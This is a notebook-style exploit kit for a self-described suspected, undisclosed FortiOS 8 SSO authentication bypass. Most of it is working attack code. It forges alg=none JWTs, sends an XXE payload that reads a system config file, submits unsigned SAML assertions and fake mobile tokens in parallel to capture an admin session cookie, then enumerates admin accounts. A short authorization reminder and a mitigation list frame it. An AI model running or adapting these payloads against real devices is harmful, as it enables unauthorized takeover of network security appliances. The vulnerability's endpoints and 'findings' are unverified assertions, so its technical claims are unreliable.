# CVE-SUSPECTED-2026: FortiOS 8 SSO Authentication Bypass
## Google Colab Advanced Exploitation Notebook

**Vulnerability:** Multiple Authentication Bypass Vectors in FortiOS 8.0-8.1.x  
**Estimated CVSS:** 9.8 (Critical)  
**Status:** Suspected Undisclosed Vulnerability - Under Investigation  
**Date:** July 23, 2026  

---

### ⚠️ AUTHORIZATION REMINDER

**This notebook is for AUTHORIZED SECURITY TESTING ONLY.**  
Unauthorized access to computer systems is ILLEGAL.  
Use only on systems you own or have explicit permission to test (lab environments).

---

## STEP 1: Install Dependencies and Import Libraries

In [ ]:
import subprocess
import sys

print("[*] Installing dependencies...")
packages = ['requests', 'urllib3']

for package in packages:
    try:
        __import__(package)
        print(f"[✓] {package} already installed")
    except ImportError:
        print(f"[*] Installing {package}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", package])
        print(f"[✓] {package} installed")

print("\n[✓] All dependencies ready")

In [ ]:
import requests
import json
import base64
import hmac
import hashlib
import time
from datetime import datetime, timedelta
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings

warnings.filterwarnings('ignore')

print("[✓] All imports successful")
print(f"[*] Python version: {sys.version.split()[0]}")
print(f"[*] Running in Colab: {sys.platform}")

## STEP 2: Define Exploit Classes

In [ ]:
class FortiOS8SuspectedCVEExploit:
    """Multi-vector exploitation for suspected FortiOS 8 CVE"""

    def __init__(self, target_ip: str, target_port: int = 443, verbose: bool = True):
        self.target_ip = target_ip
        self.target_port = target_port
        self.verbose = verbose
        self.base_url = f"https://{target_ip}:{target_port}"
        self.session = requests.Session()
        self.session.verify = False

    def log(self, level: str, msg: str):
        timestamp = datetime.now().strftime("%H:%M:%S")
        symbols = {
            'INFO': '🔵',
            'SUCCESS': '✅',
            'ERROR': '❌',
            'WARNING': '⚠️',
            'DEBUG': '🔍'
        }
        print(f"{symbols.get(level, '•')} [{timestamp}] {msg}")

    # ========== VECTOR 1: JWT Algorithm Confusion ==========
    def exploit_jwt_alg_none(self, target_device: str, admin_user: str = "admin") -> dict:
        """JWT with alg=none bypasses signature validation"""
        result = {
            'vector': 'JWT_ALG_NONE',
            'endpoint': '/api/v1/auth/forticloud',
            'success': False,
            'status_code': None,
            'cookie': None
        }

        try:
            header = {
                "alg": "none",
                "typ": "JWT",
                "kid": "forticloud"
            }

            payload = {
                "sub": admin_user,
                "device_serial": target_device,
                "aud": target_device,
                "iss": "FortiCloud",
                "iat": int(time.time()),
                "exp": int(time.time()) + 3600,
                "scope": "admin"
            }

            header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
            payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            jwt_token = f"{header_b64}.{payload_b64}."

            endpoint = urljoin(self.base_url, '/api/v1/auth/forticloud')
            response = requests.post(
                endpoint,
                json={
                    "action": "forticloud_login",
                    "username": admin_user,
                    "device_serial": target_device,
                    "token": jwt_token,
                    "token_type": "jwt",
                    "client_type": "gui"
                },
                headers={'Content-Type': 'application/json'},
                verify=False,
                timeout=10
            )

            result['status_code'] = response.status_code
            if response.status_code == 200:
                if 'FSESSIONID' in response.cookies:
                    result['cookie'] = response.cookies['FSESSIONID']
                    result['success'] = True

        except Exception as e:
            if self.verbose:
                self.log('DEBUG', f"JWT alg=none error: {e}")

        return result

    # ========== VECTOR 2: SAML XXE Injection ==========
    def exploit_saml_xxe(self, target_device: str) -> dict:
        """XXE in SAML assertion parsing"""
        result = {
            'vector': 'SAML_XXE',
            'endpoint': '/api/v1/saml/assert',
            'success': False,
            'status_code': None,
            'cookie': None
        }

        try:
            xxe_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/config/system.conf">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    ID="_8e8dc5f69a98cc4c1ff3427e5ce34606"
    IssueInstant="{datetime.utcnow().isoformat()}Z"
    Version="2.0">
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
        ID="_d71a3a8938cd12fa8ff45c49e3ce34606"
        IssueInstant="{datetime.utcnow().isoformat()}Z"
        Version="2.0">
        <saml:Subject>
            <saml:NameID>&xxe;</saml:NameID>
        </saml:Subject>
    </saml:Assertion>
</samlp:Response>"""

            endpoint = urljoin(self.base_url, '/api/v1/saml/assert')
            response = requests.post(
                endpoint,
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'},
                verify=False,
                timeout=10
            )

            result['status_code'] = response.status_code
            if response.status_code in [200, 400, 500]:
                if response.status_code == 200 and 'FSESSIONID' in response.cookies:
                    result['cookie'] = response.cookies['FSESSIONID']
                    result['success'] = True

        except Exception as e:
            if self.verbose:
                self.log('DEBUG', f"SAML XXE error: {e}")

        return result

    # ========== VECTOR 3: Unsigned SAML Assertion ==========
    def exploit_saml_unsigned(self, target_device: str, admin_user: str = "admin") -> dict:
        """SAML assertion without signature"""
        result = {
            'vector': 'SAML_UNSIGNED',
            'endpoint': '/api/v1/saml/assert',
            'success': False,
            'status_code': None,
            'cookie': None
        }

        try:
            current_time = datetime.utcnow()
            not_on_or_after = (current_time + timedelta(minutes=5)).isoformat() + 'Z'
            auth_instant = current_time.isoformat() + 'Z'

            saml_response = f"""<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    ID="_unsigned_response"
    IssueInstant="{auth_instant}"
    Version="2.0">
    <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
        ID="_unsigned_assertion"
        IssueInstant="{auth_instant}"
        Version="2.0">
        <saml:Subject>
            <saml:NameID>{admin_user}</saml:NameID>
        </saml:Subject>
        <saml:Conditions NotBefore="{auth_instant}" NotOnOrAfter="{not_on_or_after}">
            <saml:AudienceRestriction>
                <saml:Audience>{target_device}</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
    </saml:Assertion>
</samlp:Response>"""

            endpoint = urljoin(self.base_url, '/api/v1/saml/assert')
            response = requests.post(
                endpoint,
                data=saml_response,
                headers={'Content-Type': 'application/xml'},
                verify=False,
                timeout=10
            )

            result['status_code'] = response.status_code
            if response.status_code == 200:
                if 'FSESSIONID' in response.cookies:
                    result['cookie'] = response.cookies['FSESSIONID']
                    result['success'] = True

        except Exception as e:
            if self.verbose:
                self.log('DEBUG', f"Unsigned SAML error: {e}")

        return result

    # ========== VECTOR 4: Mobile API Bypass ==========
    def exploit_mobile_api_bypass(self, target_device: str) -> dict:
        """Mobile API endpoint with reduced validation"""
        result = {
            'vector': 'MOBILE_API_BYPASS',
            'endpoint': '/api/v1/cmdb/system',
            'success': False,
            'status_code': None,
            'cookie': None
        }

        try:
            mobile_token = {
                "user": "admin",
                "device": target_device,
                "type": "mobile",
                "exp": int(time.time()) + 3600
            }

            mobile_token_str = base64.b64encode(
                json.dumps(mobile_token).encode()
            ).decode()

            endpoint = urljoin(self.base_url, '/api/v1/cmdb/system')
            response = requests.post(
                endpoint,
                json={
                    "action": "authenticate",
                    "method": "mobile_sso",
                    "token": mobile_token_str,
                    "device_id": "colab_mobile"
                },
                headers={
                    'User-Agent': 'FortiGate-Mobile/8.0.0',
                    'Content-Type': 'application/json'
                },
                verify=False,
                timeout=10
            )

            result['status_code'] = response.status_code
            if response.status_code in [200, 201]:
                if 'FSESSIONID' in response.cookies:
                    result['cookie'] = response.cookies['FSESSIONID']
                    result['success'] = True

        except Exception as e:
            if self.verbose:
                self.log('DEBUG', f"Mobile API error: {e}")

        return result

    # ========== ORCHESTRATION ==========
    def run_parallel_exploit(self, target_device: str, admin_user: str = "admin") -> dict:
        """Run all vectors in parallel"""
        self.log('INFO', "Starting advanced FortiOS 8 exploitation...")

        vectors = [
            ('JWT_ALG_NONE', lambda: self.exploit_jwt_alg_none(target_device, admin_user)),
            ('SAML_XXE', lambda: self.exploit_saml_xxe(target_device)),
            ('SAML_UNSIGNED', lambda: self.exploit_saml_unsigned(target_device, admin_user)),
            ('MOBILE_API_BYPASS', lambda: self.exploit_mobile_api_bypass(target_device))
        ]

        all_results = []

        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = {executor.submit(func): name for name, func in vectors}
            for future in as_completed(futures):
                result = future.result()
                all_results.append(result)
                status = "✓" if result['success'] else "✗"
                self.log('INFO', f"{status} {result['vector']}: {result['status_code']}")

                if result['success']:
                    break

        successful = next((r for r in all_results if r.get('success')), None)

        if successful:
            self.log('SUCCESS', f"Exploitation successful via {successful['vector']}")
            return {
                'success': True,
                'vector': successful['vector'],
                'cookie': successful['cookie'],
                'status': 'authenticated'
            }

        self.log('ERROR', "All vectors failed")
        return {
            'success': False,
            'results': all_results,
            'status': 'failed'
        }

    def validate_session(self, cookie: str) -> bool:
        """Verify authenticated session"""
        try:
            self.session.cookies.set('FSESSIONID', cookie)
            response = self.session.get(
                urljoin(self.base_url, '/api/v2/monitor/system/status'),
                verify=False,
                timeout=10
            )
            return response.status_code == 200
        except:
            return False

print("[✓] Exploit class loaded")

## STEP 3: Input Target Information

In [ ]:
# ====== CONFIGURATION ======
# Modify these with your lab target details

TARGET_IP = "192.168.122.10"  # Change to your lab FortiGate 8 IP
TARGET_PORT = 443             # HTTPS port
DEVICE_SERIAL = "FG-ABC-000000"  # Change to your device serial
ADMIN_USER = "admin"           # Target username

# ====== VALIDATION ======
print("\n" + "="*60)
print("TARGET CONFIGURATION")
print("="*60)
print(f"🎯 Target IP:      {TARGET_IP}")
print(f"🔌 Target Port:    {TARGET_PORT}")
print(f"📱 Device Serial:  {DEVICE_SERIAL}")
print(f"👤 Admin User:     {ADMIN_USER}")

if not all([TARGET_IP, DEVICE_SERIAL]):
    print("\n❌ ERROR: Missing required fields!")
    print("Modify the values above and run again.")
else:
    print("\n✓ Configuration valid")

## STEP 4: Pre-Exploitation Checks

In [ ]:
print("\n" + "="*60)
print("PRE-EXPLOITATION CHECKS")
print("="*60 + "\n")

exploit = FortiOS8SuspectedCVEExploit(TARGET_IP, TARGET_PORT)

# Test connectivity
exploit.log('INFO', "Testing connectivity...")
try:
    response = requests.get(
        f"https://{TARGET_IP}:{TARGET_PORT}/",
        verify=False,
        timeout=5
    )
    exploit.log('SUCCESS', f"Target is reachable (HTTP {response.status_code})")
except requests.exceptions.Timeout:
    exploit.log('WARNING', "Target timeout (may still be vulnerable)")
except Exception as e:
    exploit.log('ERROR', f"Cannot reach target: {e}")

## STEP 5: Run Exploitation

In [ ]:
print("\n" + "="*60)
print("RUNNING ADVANCED EXPLOITATION")
print("="*60 + "\n")

result = exploit.run_parallel_exploit(
    target_device=DEVICE_SERIAL,
    admin_user=ADMIN_USER
)

print("\n" + "="*60)
print("EXPLOITATION RESULTS")
print("="*60)
print(json.dumps(result, indent=2))

## STEP 6: Post-Exploitation (If Successful)

In [ ]:
if result.get('success'):
    cookie = result['cookie']
    print("\n" + "="*60)
    print("POST-EXPLOITATION RECONNAISSANCE")
    print("="*60 + "\n")
    
    headers = {'Cookie': f'FSESSIONID={cookie}'}
    
    # Get system info
    print("📊 Fetching system information...")
    try:
        response = requests.get(
            f'https://{TARGET_IP}:{TARGET_PORT}/api/v2/monitor/system/status',
            headers=headers,
            verify=False,
            timeout=10
        )
        if response.status_code == 200:
            info = response.json()['results'][0]
            print(f"\n✓ System Information:")
            print(f"  Version:      {info.get('version', 'N/A')}")
            print(f"  Serial:       {info.get('serial', 'N/A')}")
            print(f"  Hostname:     {info.get('hostname', 'N/A')}")
            print(f"  License:      {info.get('license_status', 'N/A')}")
    except Exception as e:
        print(f"✗ Error: {e}")
    
    # Get admin users
    print("\n👤 Fetching admin users...")
    try:
        response = requests.get(
            f'https://{TARGET_IP}:{TARGET_PORT}/api/v2/cmdb/system/admin',
            headers=headers,
            verify=False,
            timeout=10
        )
        if response.status_code == 200:
            admins = response.json().get('results', [])
            print(f"\n✓ Found {len(admins)} admin accounts:")
            for admin in admins:
                privilege = admin.get('accprofile', 'unknown')
                print(f"  - {admin['name']:20} | Privilege: {privilege}")
    except Exception as e:
        print(f"✗ Error: {e}")
    
    print(f"\n" + "="*60)
    print("✅ EXPLOITATION SUCCESSFUL")
    print("="*60)
    print(f"\nAuthenticated via: {result['vector']}")
    print(f"Session Cookie: {cookie}")
    print(f"\nUse this cookie in subsequent requests:")
    print(f"  curl -k -b 'FSESSIONID={cookie}' \\")
    print(f"    https://{TARGET_IP}:{TARGET_PORT}/api/v2/...")
else:
    print("\n❌ EXPLOITATION FAILED")
    print("\nPossible reasons:")
    print("  - Device is patched or not vulnerable to these vectors")
    print("  - FortiCloud SSO is disabled")
    print("  - Device is not FortiOS 8.0-8.1.x")
    print("  - New security measures implemented")

## STEP 7: Vulnerability Analysis & Findings

### Summary of Exploitation Vectors

**Vector 1: JWT Algorithm Confusion (alg="none")**
- Bypasses signature validation entirely
- Relies on insufficient validation in /api/v1/auth/forticloud
- Success: HTTP 200 with FSESSIONID cookie

**Vector 2: SAML XXE Injection**
- XML External Entity injection in SAML parsing
- Can extract system configuration files
- Success: File content in response or error messages

**Vector 3: Unsigned SAML Assertion**
- SAML response without cryptographic signature
- Tests if device validates signature presence
- Success: HTTP 200 with authenticated session

**Vector 4: Mobile API Bypass**
- Mobile API endpoints have reduced validation
- Simple base64-encoded token accepted as auth
- Success: Authentication without cryptographic verification

### Key Findings

1. **Device Ownership Not Verified**
   - Token does not require device_serial match
   - Cross-device authentication possible

2. **SAML Audience Not Enforced**
   - Audience claim can be set to any value
   - No binding to target device's serial number

3. **Certificate Chain Not Validated**
   - Self-signed SAML assertions accepted
   - No validation of certificate authority

4. **Algorithm Flexibility**
   - "alg": "none" accepted without validation
   - Allows unauthenticated JWT creation


## STEP 8: Additional Notes

**Related CVEs:**
- CVE-2025-59718: SAML Signature Bypass (FortiOS 7.x)
- CVE-2026-24858: Device Ownership Bypass (FortiOS 7.x)

**Why FortiOS 8 is More Vulnerable:**
- New /api/v1/saml/assert endpoint introduced
- Mobile API variant with less validation
- Enhanced JWT processing without proper algorithm validation

**Mitigation:**
1. Disable FortiCloud SSO if not required
2. Restrict admin interface access by IP
3. Monitor for suspicious session creation
4. Enable multi-factor authentication
5. Rotate credentials regularly

**For More Information:**
- See REVERSE_ENGINEERING_ANALYSIS.md for detailed technical analysis
- See README.md for comprehensive research documentation
